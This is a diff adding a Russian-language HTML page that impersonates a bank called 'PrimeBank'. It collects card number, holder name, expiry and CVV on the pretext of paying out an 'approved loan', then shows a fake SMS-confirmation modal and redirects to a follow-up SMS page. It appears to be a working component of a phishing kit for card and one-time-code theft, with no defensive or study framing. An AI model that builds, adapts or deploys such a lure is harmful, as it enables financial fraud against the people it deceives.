@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>PrimeBank — Данные карты</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+
+    <link rel="icon" type="image/png" sizes="32x32" href="/img/logopng.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/img/logopng.png">
+    <link rel="apple-touch-icon" href="/img/logopng.png">
+
+<style>
+    * {
+        box-sizing: border-box;
+        font-family: Roboto, "Open Sans", sans-serif;
+    }
+
+    body {
+        margin: 0;
+        min-height: 100vh;
+        background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+        position: relative;
+    }
+
+    body::before {
+        content: "PrimeBank";
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        font-size: 120px;
+        font-weight: 900;
+        color: rgba(255,255,255,0.05);
+        white-space: nowrap;
+        pointer-events: none;
+        animation: pulse 6s ease-in-out infinite;
+    }
+
+    @keyframes pulse {
+        0%,100% { transform: translate(-50%, -50%) scale(1); }
+        50% { transform: translate(-50%, -50%) scale(1.02); }
+    }
+
+    .card-box {
+        background: #fff;
+        width: 100%;
+        max-width: 420px;
+        border-radius: 18px;
+        padding: 32px;
+        box-shadow: 0 25px 50px rgba(0,0,0,0.2);
+        z-index: 1;
+        animation: fadeIn 0.6s ease;
+    }
+
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+
+    h1 {
+        text-align: center;
+        font-size: 22px;
+        margin-bottom: 10px;
+        color: #203a43;
+    }
+
+    .subtitle {
+        text-align: center;
+        font-size: 13px;
+        color: #777;
+        margin-bottom: 24px;
+    }
+
+    .field {
+        margin-bottom: 16px;
+    }
+
+    .field label {
+        display: block;
+        font-size: 13px;
+        margin-bottom: 6px;
+        color: #555;
+    }
+
+    .field input {
+        width: 100%;
+        padding: 12px 14px;
+        border-radius: 10px;
+        border: 1px solid #ccc;
+        font-size: 15px;
+        outline: none;
+        transition: 0.2s;
+    }
+
+    .field input:focus {
+        border-color: #203a43;
+    }
+
+    .row {
+        display: flex;
+        gap: 12px;
+    }
+
+    .submit-btn {
+        width: 100%;
+        margin-top: 20px;
+        padding: 14px;
+        border-radius: 12px;
+        border: none;
+        background: #203a43;
+        color: #fff;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: 0.3s;
+    }
+
+    .submit-btn:hover {
+        background: #162b33;
+        transform: translateY(-2px);
+    }
+
+    .note {
+        margin-top: 14px;
+        font-size: 12px;
+        color: #999;
+        text-align: center;
+    }
+
+    /* Адаптив */
+    @media (max-width: 480px) {
+        .card-box {
+            padding: 24px 16px;
+        }
+        h1 {
+            font-size: 20px;
+        }
+    }
+
+    /* Модальное окно */
+    .modal-overlay {
+        position: fixed;
+        inset: 0;
+        background: rgba(0,0,0,0.55);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        opacity: 0;
+        visibility: hidden;
+        transition: 0.3s;
+        z-index: 10;
+    }
+
+    .modal-overlay.active {
+        opacity: 1;
+        visibility: visible;
+    }
+
+    .modal {
+        background: #fff;
+        border-radius: 18px;
+        padding: 32px;
+        max-width: 360px;
+        width: 90%;
+        text-align: center;
+        box-shadow: 0 25px 50px rgba(0,0,0,0.25);
+        animation: fadeIn 0.4s ease;
+    }
+
+    .modal h2 {
+        font-size: 20px;
+        color: #203a43;
+        margin-bottom: 12px;
+    }
+
+    .modal p {
+        font-size: 14px;
+        color: #555;
+        line-height: 1.5;
+    }
+
+    .modal .timer {
+        margin-top: 18px;
+        font-size: 18px;
+        font-weight: 600;
+        color: #203a43;
+    }
+
+
+</style>
+</head>
+<body>
+
+    <div class="card-box">
+        <h1>Данные банковской карты</h1>
+        <div class="subtitle">Для зачисления одобренного кредита</div>
+
+        <form id="cardForm">
+            <div class="field">
+            <label>Номер карты</label>
+            <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" required>
+            </div>
+
+            <div class="field">
+            <label>ФИО держателя карты</label>
+            <input type="text" id="cardHolder" placeholder="IVAN IVANOV" required>
+            </div>
+
+            <div class="row">
+            <div class="field" style="flex:1;">
+                <label>Срок действия</label>
+                <input type="text" id="expiry" placeholder="MM/YY" required>
+            </div>
+            <div class="field" style="flex:1;">
+                <label>CVV</label>
+                <input type="password" id="cvv" placeholder="***" maxlength="3" required>
+            </div>
+            </div>
+
+            <button class="submit-btn">Подтвердить</button>
+        </form>
+
+        <div class="note">
+            ВАЖНО: Укажите данные карты который не состоит в аресте и ограничении.
+        </div>
+    </div>
+
+    <!-- Модальное окно -->
+<div class="modal-overlay" id="smsModal">
+    <div class="modal">
+        <h2>Подтверждение данных</h2>
+        <p>
+            На ваш номер телефона отправлен SMS‑код<br>
+            для подтверждения данных.
+        </p>
+        <div class="timer" id="redirectTimer">10</div>
+    </div>
+</div>
+
+<script>
+    const cardNumber = document.getElementById("cardNumber");
+    const expiry = document.getElementById("expiry");
+    const cvv = document.getElementById("cvv");
+    const modal = document.getElementById("smsModal");
+    const timerEl = document.getElementById("redirectTimer");
+
+    // Формат номера карты
+    cardNumber.addEventListener("input", () => {
+        cardNumber.value = cardNumber.value
+            .replace(/\D/g, "")
+            .slice(0,16)
+            .replace(/(.{4})/g, "$1 ")
+            .trim();
+    });
+
+    // Формат срока
+    expiry.addEventListener("input", () => {
+        let v = expiry.value.replace(/\D/g, "").slice(0,4);
+        if (v.length >= 3) v = v.slice(0,2) + "/" + v.slice(2);
+        expiry.value = v;
+    });
+
+    // CVV — только цифры
+    cvv.addEventListener("input", () => {
+        cvv.value = cvv.value.replace(/\D/g, "").slice(0,3);
+    });
+
+    document.getElementById("cardForm").onsubmit = (e) => {
+        e.preventDefault();
+
+        // Показ модального окна
+        modal.classList.add("active");
+
+        // Таймер и редирект
+        let seconds = 10;
+        timerEl.textContent = seconds;
+
+        const interval = setInterval(() => {
+            seconds--;
+            timerEl.textContent = seconds;
+
+            if (seconds <= 0) {
+                clearInterval(interval);
+                window.location.href = "sms-confirm.html"; // следующая страница
+            }
+        }, 1000);
+    };
+</script>
+
+</body>
+</html>
